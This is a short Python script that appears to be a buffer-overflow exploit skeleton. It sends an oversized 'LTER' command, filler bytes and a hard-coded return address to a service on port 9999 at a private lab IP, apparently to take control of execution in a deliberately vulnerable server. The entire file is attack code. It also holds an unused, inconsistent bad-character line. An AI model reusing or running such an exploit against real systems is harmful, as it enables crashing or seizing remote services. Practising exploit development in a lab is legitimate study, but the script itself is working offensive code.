#!/usr/bin/env python

import sys
import socket
chars = list(set(range(1, 256)) - set(['\x00', '\x81'])) 

message  = "LTER "
message += 'A' * 3499
message += 'D' * 4
message += "\x0b\x12\x50\x62"
message += 'E' * (4000-3499-4-4)
message += ".\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

s.send(message)
